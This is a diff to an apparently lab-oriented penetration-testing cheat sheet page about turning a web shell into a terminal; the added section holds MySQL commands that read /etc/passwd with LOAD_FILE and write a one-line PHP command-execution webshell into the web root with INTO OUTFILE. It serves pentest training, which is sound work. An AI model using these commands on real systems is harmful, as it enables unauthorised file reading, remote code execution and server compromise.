@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=web-shell-to-terminal) · [All tools](/index)
+
 ## 1. Kali — listen
 
 **Kali**
@@ -80,11 +82,35 @@ Replace ROWS and COLUMNS with the numbers from Kali. If your local terminal is b
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=web%20shell)
+## Notebook recipes
 
-## Learning and original examples
+1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="From DB access to the filesystem (and RCE)">
+
+### From DB access to the filesystem (and RCE)
+
+**MySQL and MariaDB Enumeration**
+
+```sql
+-- Check whether file operations are allowed and where they're confined
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- Read an arbitrary local file as the MySQL service account
+SELECT LOAD_FILE('/etc/passwd');
+
+-- Write a PHP webshell into the web root → browse to it for RCE
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+</Accordion>
+
+</AccordionGroup>
+
+## Related tools and references
+
 - [Windows → Kali reverse shell](/commands/windows-reverse-shell)
 - [Upgrade a Linux shell](/commands/shell-upgrade)
 - [Evil-WinRM](/commands/evil-winrm)
